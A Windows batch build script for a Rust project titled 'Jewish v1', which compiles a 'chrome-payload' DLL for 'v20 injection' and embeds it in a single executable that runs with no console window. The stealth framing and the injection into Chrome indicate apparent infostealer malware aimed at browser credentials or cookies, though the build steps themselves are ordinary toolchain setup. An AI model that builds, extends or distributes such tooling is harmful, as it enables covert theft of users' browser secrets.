@echo off
setlocal enabledelayedexpansion

echo.
echo ============================================================
echo   Jewish v1 - Stealth single-exe build
echo ============================================================
echo.

set "PATH=%USERPROFILE%\.cargo\bin;%PATH%"

call :ensure_rust
if errorlevel 1 exit /b 1

call :ensure_msvc
if errorlevel 1 exit /b 1

call :do_build
if errorlevel 1 exit /b 1

echo.
echo [OK] Build complete - release\jewish.exe
echo     Single file, payload embedded, no console window.
echo.
pause
exit /b 0

:ensure_rust
where rustc >nul 2>&1
if not errorlevel 1 (
    echo [OK] Rust found
    exit /b 0
)
echo [*] Downloading Rust...
curl -fsSL -o "%TEMP%\rustup-init.exe" https://win.rustup.rs/x86_64
"%TEMP%\rustup-init.exe" -y --default-toolchain stable
set "PATH=%USERPROFILE%\.cargo\bin;%PATH%"
where rustc >nul 2>&1 || (echo [X] Rust install failed & pause & exit /b 1)
exit /b 0

:ensure_msvc
call :find_vcvars
if defined VCVARS (
    if exist "!VCVARS!" (
        call "!VCVARS!" >nul 2>&1
        where cl >nul 2>&1
        if not errorlevel 1 (
            echo [OK] MSVC ready
            echo     !VCVARS!
            exit /b 0
        )
        echo [!] vcvars found but cl.exe missing
        echo     Install workload: "Desktop development with C++"
        echo     or "MSVC v143 - VS 2022 C++ x64/x86 build tools"
    )
)
where link >nul 2>&1
if not errorlevel 1 (
    echo [OK] MSVC ready - link already in PATH
    exit /b 0
)
echo [X] Visual C++ Build Tools not detected
echo.
echo     Open "Visual Studio Installer" and verify:
echo       - Visual Studio Build Tools 2022
echo       - Workload: "Desktop development with C++"
echo         (or at least MSVC v143 build tools + Windows SDK)
echo.
echo     Expected file:
echo       C:\Program Files\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat
echo.
call :probe_msvc
echo     https://visualstudio.microsoft.com/visual-cpp-build-tools/
pause
exit /b 1

:find_vcvars
set "VCVARS="
set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
if exist "%VSWHERE%" (
    for /f "usebackq delims=" %%I in (`"%VSWHERE%" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath 2^>nul`) do (
        if exist "%%I\VC\Auxiliary\Build\vcvars64.bat" (
            set "VCVARS=%%I\VC\Auxiliary\Build\vcvars64.bat"
        )
    )
)
if defined VCVARS exit /b 0
for %%Y in (2026 2025 2022) do (
    for %%E in (BuildTools Community Professional Enterprise) do (
        set "_C=C:\Program Files\Microsoft Visual Studio\%%Y\%%E\VC\Auxiliary\Build\vcvars64.bat"
        if exist "!_C!" set "VCVARS=!_C!"
    )
)
exit /b 0

:probe_msvc
if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe" (
    echo     Installed VS products:
    "%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe" -all -products * -property displayName,installationPath 2>nul
) else (
    echo     vswhere.exe not found - VS Installer may be missing
)
for %%Y in (2026 2025 2022) do (
    for %%E in (BuildTools Community Professional Enterprise) do (
        set "_C=C:\Program Files\Microsoft Visual Studio\%%Y\%%E\VC\Auxiliary\Build\vcvars64.bat"
        if exist "!_C!" echo     Found: !_C!
    )
)
exit /b 0

:do_build
cd /d "%~dp0"

echo [*] Building payload DLL (required for v20 injection)...
cargo build --release -p chrome-payload || goto build_fail
if not exist "target\release\chrome_payload.dll" (
    echo [X] target\release\chrome_payload.dll missing after payload build
    pause
    exit /b 1
)
for %%F in ("target\release\chrome_payload.dll") do echo     payload: %%~zF bytes

echo [*] Building jewish.exe (embedding payload)...
echo     Final link step may sit at 237/238 for ~30-90s — normal.
cargo build --release -p jewish || goto build_fail

if not exist release mkdir release
copy /Y "target\release\jewish.exe" "release\" >nul
exit /b 0

:build_fail
echo [X] Build failed
pause
exit /b 1
